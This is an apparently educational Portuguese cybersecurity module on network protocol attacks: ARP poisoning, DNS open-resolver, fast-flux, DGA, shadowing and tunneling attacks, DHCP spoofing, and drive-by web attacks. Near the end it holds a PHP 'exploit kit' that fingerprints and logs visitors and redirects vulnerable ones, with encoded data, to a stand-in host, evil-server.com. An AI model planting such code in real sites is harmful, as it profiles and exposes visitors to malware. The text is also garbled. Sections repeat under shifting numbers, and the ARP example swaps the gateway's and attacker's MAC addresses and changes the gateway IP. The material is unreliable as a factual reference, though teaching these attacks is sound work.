4.0.1 Por que devo fazer este módulo?

⚠️ ATENÇÃO As bases da rede devem ser protegidas, mas isso não é suficiente para proteger completamente a sua rede.

Os protocolos que são usados para conduzir os negócios do dia-a-dia da organização também devem ser protegidos. Além disso, protocolos e software que fornecem serviços através da rede também podem ser alvo de agentes de ameaças. Um analista de segurança cibernética deve estar familiarizado com as vulnerabilidades e ameaças aos fundamentos da comunicação em rede.

Neste módulo, você aprenderá como os protocolos comuns usados na empresa funcionam e como eles são vulneráveis a ataques e exploração.

4.1.1 Vulnerabilidades ARP

Os hosts transmitem uma solicitação ARP para outros hosts no segmento de rede para determinar o endereço MAC de um host com um endereço IP específico. Todos os hosts na sub-rede recebem e processam a solicitação ARP. O host com o endereço IP correspondente na solicitação ARP envia uma resposta ARP.

🔍 PROCESSO ARP
PC-A
192.168.1.5
MAC: AA:AA:AA:AA:AA:AA
H2
192.168.1.6
MAC: A1:A1:A1:A1:A1:A1
H3
192.168.1.8
MAC: BB:BB:BB:BB:BB:BB
ATACANTE
192.168.1.7
MAC: EE:EE:EE:EE:EE:EE
Dispositivo Endereço IP Endereço MAC Cache ARP
PC-A 192.168.1.5 AA:AA:AA:AA:AA:AA ???
Gateway (R1) 192.168.1.254 ??:??:??:??:??:?? -
Solicitação ARP: MAC of 192.168.1.254
ARP Gratuito

Qualquer cliente pode enviar uma resposta ARP não solicitada denominada "ARP gratuito". Isso geralmente é feito quando um dispositivo é inicializado para informar todos os outros dispositivos na rede local o endereço MAC do novo dispositivo.

⚠️ Vulnerabilidade

Qualquer host pode reivindicar ser o proprietário de qualquer IP/MAC que escolher. Um ator de ameaça pode envenenar o cache ARP de dispositivos na rede local, criando um ataque MITM para redirecionar o tráfego.

4.1.2 Envenenamento de cache ARP

O envenenamento do cache ARP pode ser usado para iniciar vários ataques do tipo man-in-the-middle (MITM).

PC-A requer o endereço MAC do seu gateway padrão (R1); então, ele envia uma solicitação ARP para o endereço MAC 192.168.10.1.

Solicitação ARP: Qual o MAC de 192.168.10.1?

O gateway responde com seu MAC legítimo. Mas um atacante pode responder também...

R1 responde: 192.168.10.1 está em EE:EE:EE:EE:EE:EE
Atacante responde: 192.168.10.1 está em AA:AA:AA:AA:AA:AA

O atacante envia ARPs gratuitos falsos dizendo "Sou o gateway" sem ninguém perguntar.

Broadcast: "192.168.10.1 está em AA:AA:AA:AA:AA:AA"
Todos os hosts atualizam suas tabelas ARP com a informação falsa.
🛠️ Ferramentas para ataques ARP MITM
dsniff Cain & Abel ettercap Yersinia

Existem muitas ferramentas disponíveis na Internet para criar ataques ARP MITM.

🎯 Objetivo do Ataque

Associar o endereço MAC do ator de ameaça ao endereço IP do gateway padrão nos caches ARP dos hosts no segmento LAN. Isso posiciona o agente de ameaça entre a vítima e todos os outros sistemas fora da sub-rede local.

4.1.3 Ataques DNS

O protocolo DNS (Domain Name Service) define um serviço automatizado que corresponde a nomes de recursos, como www.cisco.com, com o endereço de rede numérico necessário (IPv4 ou IPv6). Ele inclui o formato para consultas, respostas e dados, e usa os registros de recursos (RR) para identificar o tipo de resposta DNS.

A proteção do DNS geralmente é ignorada. No entanto, é crucial para a operação de uma rede e deve ser protegido adequadamente.
Principais tipos de ataques DNS:
🔓 Ataques de resolver aberto de DNS

Muitas organizações usam serviços de servidores DNS abertos ao público, como o GoogleDNS (8.8.8.8). Esse tipo de servidor DNS responde a consultas de clientes fora de seu domínio administrativo e é vulnerável a diversas atividades maliciosas.

👤 Ataques furtivos de DNS

Para ocultar sua identidade, os agentes de ameaças usam técnicas furtivas como Fast Flux, Double IP Flux e algoritmos de geração de domínio (DGA).

🌑 Ataques de sombreamento de domínio DNS

O agente de ameaças coleta credenciais de conta de domínio para criar silenciosamente vários subdomínios usados durante ataques, sem alertar o proprietário real do domínio pai.

🕳️ Ataques de tunelamento de DNS

Encapsulamento de tráfego não-DNS (como SSH ou HTTP) dentro de consultas e respostas DNS para bypass de firewalls e exfiltração de dados.

4.1.4 Ataques de resolver aberto de DNS

Um resolver aberto de DNS responde a consultas de clientes fora de seu domínio administrativo. Estes são vulneráveis a várias atividades maliciosas:

Os agentes de ameaças enviam informações de recurso de registro falsificado (RR) a um resolvedor de DNS para redirecionar usuários de sites legítimos para sites maliciosos.

Como funciona: O atacante injeta um registro falso no cache do resolvedor, fazendo com que www.banco.com aponte para o IP do atacante.
Legítimo: www.banco.com → 192.168.1.100
Falsificado: www.banco.com → 192.168.1.200 (Atacante)

Os agentes de ameaças usam ataques DoS ou DDoS em resolvedores abertos do DNS para aumentar o volume de ataques e ocultar a verdadeira fonte de um ataque.

Processo:

  1. Atacante forja o IP da vítima em consultas DNS
  2. Envia consultas para resolvedores abertos
  3. Resolvedores respondem para a vítima com respostas grandes (amplificação)
📈
Fator de amplificação
~50x

Exemplo: Consulta de 60 bytes pode gerar resposta de 3000+ bytes

Um ataque de DoS que consome todos os recursos disponíveis para afetar negativamente as operações do resolvedor aberto do DNS.

Impacto: O resolvedor fica sobrecarregado, exigindo reinicialização ou interrupção dos serviços.

Recursos 100% consumidos

4.1.5 Ataques furtivos de DNS

Para ocultar sua identidade, os agentes de ameaças usam técnicas furtivas de DNS para realizar seus ataques.

⚡ Fluxo Rápido (Fast Flux)

Técnica onde o atacante altera rapidamente os registros DNS, alternando entre centenas ou milhares de IPs comprometidos para esconder o servidor real.

domínio.com → IP1
domínio.com → IP2
domínio.com → IP3
🔄 Fluxo de IP duplo (Double IP Flux)

Variação do Fast Flux que também altera os servidores DNS autoritativos, criando uma rede mais resiliente e difícil de rastrear.

NS1 → IP_A NS2 → IP_B
🔢 Algoritmos de geração de domínio (DGA)

Malwares geram dinamicamente centenas de domínios aleatórios diariamente para comunicação com C&C, dificultando bloqueios.

a1b2c3.ru x9y8z7.net m4n5o6.org
Algoritmos de Geração de Domínio (DGA): Usados por botnets para esconder servidores de comando e controle. O malware e o operador usam o mesmo seed para gerar os mesmos domínios.

4.1.6 Ataques de sombreamento de domínio DNS

O sombreamento de domínio envolve o agente de ameaças coletando credenciais de conta de domínio para criar silenciosamente vários subdomínios a serem usados durante os ataques.

Atacante obtém credenciais de conta de domínio (phishing, vazamento, etc.)
Cria subdomínios como "malicioso.dominio.com"
Subdomínios apontam para servidores maliciosos
dominio.com
↓
mal.sub.dominio.com
↓
Servidor do Atacante

Esses subdomínios normalmente apontam para servidores mal-intencionados sem alertar o proprietário real do domínio pai.

4.1.7 Ataques de tunelamento de DNS

O tunelamento DNS encapsula tráfego não-DNS (como SSH, HTTP ou comando & controle) dentro de consultas e respostas DNS, permitindo que atacantes burlem firewalls e exfiltrem dados.

📤 Exfiltração de dados

Dados sensíveis são codificados em consultas DNS:

dado1234.evil.com

O servidor DNS do atacante decodifica e coleta os dados.

🎮 Comando e Controle (C2)

Botnets usam DNS para receber comandos:

comando.update.evil.com

Difícil de bloquear pois DNS é geralmente permitido.

🔒 Firewall permite DNS → Atacante explora

Melhor defesa: DNSSEC, monitoramento de tráfego DNS anômalo, rate limiting e fechar resolvedores abertos desnecessários.

4.1.5 Ataques furtivos de DNS

Para ocultar sua identidade, os agentes de ameaças usam técnicas furtivas de DNS para realizar seus ataques. Clique em cada cabeçalho para ver as definições:

Os atores de ameaças usam essa técnica para ocultar seus sites de entrega de phishing e malware atrás de uma rede que muda rapidamente de hosts DNS comprometidos.

Característica: Os endereços IP do DNS são alterados continuamente em minutos.

As redes de bots geralmente empregam técnicas do Fast Flux para impedir a detecção eficaz de servidores mal-intencionados.

domínio.com → IP1 (minuto 1)
domínio.com → IP2 (minuto 2)
domínio.com → IP3 (minuto 3)

Os atores de ameaças usam essa técnica para alterar rapidamente o nome do host para os mapeamentos de endereço IP e também para alterar o servidor de nomes autoritativo.

Dupla camada: Altera tanto os endereços IP quanto os servidores DNS autoritativos.

Isso aumenta a dificuldade de identificar a fonte do ataque, criando uma rede mais resiliente e difícil de rastrear.

Os atores de ameaças usam essa técnica em malware para gerar aleatoriamente nomes de domínio que podem ser usados como pontos de encontro para seus servidores de comando e controle (C&C).

Exemplo de geração diária:

a1b2c3.ru
x9y8z7.net
m4n5o6.org

O malware e o operador usam o mesmo seed para gerar os mesmos domínios, dificultando bloqueios estáticos.

Sombreamento de domínio DNS

O sombreamento de domínio envolve o agente de ameaças coletando credenciais de conta de domínio para criar silenciosamente vários subdomínios a serem usados durante os ataques. Esses subdomínios normalmente apontam para servidores mal-intencionados sem alertar o proprietário real do domínio pai.

4.1.6 Tunelamento DNS

Botnets se tornaram um método de ataque popular de atores ameaçadores. Na maioria das vezes, os botnets são usados para espalhar malware ou iniciar ataques de DDoS e phishing.

Atenção: O DNS na empresa às vezes é negligenciado como um protocolo que pode ser usado por botnets. Quando o tráfego DNS é determinado como parte de um incidente, o ataque geralmente já acabou.
Bot
C&C
🔍 Como funciona o tunelamento DNS:
Registros DNS explorados:
TXT MX SRV NULL A CNAME

Por exemplo, um registro TXT pode armazenar comandos enviados para hosts infectados como respostas DNS.

Processo passo a passo:
  1. Dados divididos em blocos codificados
  2. Cada bloco colocado em um rótulo de nome de domínio
  3. Consulta enviada aos servidores DNS recursivos
  4. Encaminhada ao servidor autoritativo do invasor
📡 Fluxo do Tunelamento DNS com registro TXT
1. Bot
"dado1234.evil.com"
2. Recursor
3. ISP DNS

✅ Como detectar:
  • Consultas DNS mais longas que a média
  • Nomes de domínio suspeitos ou aleatórios
  • Domínios associados a serviços DNS dinâmicos
🛡️ Como prevenir:
  • Soluções de segurança DNS (Cisco Umbrella/OpenDNS)
  • Filtros que inspecionam tráfego DNS
  • Bloquear comunicações de saída de hosts infectados

4.1.7 DHCP: Operação Normal

Os servidores DHCP fornecem dinamicamente informações de configuração de IP aos clientes. A figura mostra a sequência típica de uma troca de mensagens DHCP entre cliente e servidor.

Processo DORA (Discover, Offer, Request, Acknowledge)
Cliente DHCP
"Gostaria de solicitar um endereço."
DHCPDISCOVER (Broadcast)
Servidor DHCP
"Sou DHCPsvr1. Este é um endereço que posso oferecer".
DHCPOFFER (Unicast)
IP: 192.168.10.15
Mask: 255.255.255.0
Gateway: 192.168.10.1
Lease: 3 days
Cliente DHCP
"Aceito a oferta do endereço IP".
DHCPREQUEST (Broadcast)
Servidor DHCP
"Sua aceitação é reconhecida".
DHCPACK (Unicast)

Na figura, um cliente transmite uma mensagem de descoberta DHCP (broadcast). O servidor DHCP responde com uma oferta direta (unicast) que inclui informações de endereçamento. O cliente transmite em difusão (broadcast) uma solicitação DHCP para informar ao servidor que aceita a oferta. O servidor responde com uma confirmação direta (unicast) aceitando a solicitação.

4.1.8 Ataques DHCP (Spoofing)

Um ataque de spoofing de DHCP ocorre quando um servidor DHCP invasor está conectado à rede e fornece falsos parâmetros de configuração IP aos clientes legítimos.

⚠️ Informações enganosas fornecidas:
  • Gateway padrão errado - Atacante fornece gateway inválido ou seu próprio IP para ataque MITM
  • Servidor DNS errado - Aponta usuário para sites maliciosos
  • Endereço IP errado - Cria ataque de negação de serviço (DoS)
📋 Etapas do ataque de falsificação DHCP:

Um cliente legítimo se conecta à rede e requer parâmetros de configuração de IP. O cliente transmite uma solicitação de descoberta de DHCP procurando uma resposta de um servidor DHCP. Ambos os servidores (legítimo e atacante) recebem a mensagem.

DHCP Discover (Broadcast)

Os servidores DHCP legítimos e o não autorizado respondem com parâmetros de configuração de IP válidos. O cliente responde à primeira oferta recebida.

Servidor Legítimo
DHCP Offer
Servidor Não Autorizado
DHCP Offer

Nesse cenário, o cliente recebeu a oferta não autorizada primeiro. Ele transmite uma solicitação DHCP, aceitando os parâmetros do servidor não autorizado. Cada servidor (legítimo e não autorizado) recebe a solicitação.

DHCP Request (Broadcast)
Cliente aceita oferta do atacante

Apenas o servidor não autorizado envia uma resposta ao cliente para confirmar sua solicitação (DHCP ACK). O servidor legítimo para de se comunicar com o cliente porque a solicitação já foi confirmada.

DHCP ACK (Unicast) - Atacante

ATACANTE (MITM)

4.2.1 HTTP e HTTPS

Os navegadores da Internet são usados por quase todos. Bloquear completamente a navegação na Web não é uma opção porque as empresas precisam de acesso à Web, sem comprometer a segurança.

Missão do analista de segurança: Para investigar ataques baseados na Web, os analistas devem ter uma boa compreensão de como funciona um ataque padrão baseado na Web.
🎯 Estágios de um ataque típico da web:
1 Vítima acessa página comprometida

A vítima visita inconscientemente uma página web que foi comprometida por malware.

2 Redirecionamento

A página comprometida redireciona o usuário através de vários servidores comprometidos para um site com código malicioso.

3 Drive-by Download

Um kit de exploração (geralmente PHP) verifica software vulnerável no computador da vítima (OS, Java, Flash).

4 Download do exploit

Kit de exploração baixa código que usa a vulnerabilidade para executar código malicioso.

5 Conexão ao servidor de malware

Computador comprometido baixa carga útil (malware ou downloader).

6 Execução do malware

O último pacote de malware é executado no computador da vítima.

CASO DE USO: Kit de Exploração em PHP (Fins Educacionais)

Cenário: Um site legítimo foi comprometido e os atacantes injetaram um script PHP que funciona como um "exploit kit". Quando um usuário acessa a página, o script verifica o navegador e tenta explorar vulnerabilidades conhecidas. 

<?php
// KIT DE EXPLORAÇÃO SIMPLES (APENAS PARA ESTUDO)
// Este código demonstra como atacantes identificam vítimas

// Coleta informações do navegador da vítima
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direto';

// Detecta software vulnerável via User-Agent
$vulnerabilities = [];

if (preg_match('/MSIE [5-8]/i', $user_agent)) {
    $vulnerabilities[] = 'Internet Explorer (MS15-018)';
}

if (preg_match('/Java\/1\.[6-7]/i', $user_agent)) {
    $vulnerabilities[] = 'Java SE 6/7 (CVE-2013-2465)';
}

if (preg_match('/Flash [0-9]{1,2}\.[0-9]/i', $user_agent)) {
    $vulnerabilities[] = 'Flash Player (CVE-2018-4878)';
}

// Registra a vítima em um log (para o atacante)
$log_entry = date('Y-m-d H:i:s') . " | IP: $ip | UA: $user_agent | Ref: $referer\n";
file_put_contents('victims.log', $log_entry, FILE_APPEND);

// Se encontrou vulnerabilidades, redireciona para o servidor de exploit
if (!empty($vulnerabilities)) {
    // Codifica as informações para o servidor C2
    $data = base64_encode(json_encode([
        'ip' => $ip,
        'vulns' => $vulnerabilities
    ]));

    // Redireciona para o servidor de malware (ofuscação)
    header('Location: http://evil-server.com/exploit?data=' . $data);
    exit;
} else {
    // Se não detectou vulnerabilidades, exibe página normal (fingindo ser legítimo)
    echo '<html><body><h1>Bem-vindo!</h1></body></html>';
}
?>
⚠️ APENAS PARA ESTUDO PHP Exploit Kit Simulado

O código acima é uma representação educacional de como um kit de exploração em PHP coleta informações da vítima e redireciona para servidores maliciosos. Em ataques reais, os códigos são ofuscados e utilizam múltiplas camadas de redirecionamento.

📊 Códigos de Status HTTP
1xx Informativo

Resposta provisória, apenas Status Line e cabeçalhos.

2xx Sucesso

Solicitação recebida, compreendida e aceita.

3xx Redirecionamento

Outras ações necessárias para completar a requisição.

4xx Erro do Cliente

Requisição inválida ou mal formada.

5xx Erro do Servidor

Servidor falhou ao processar requisição válida.
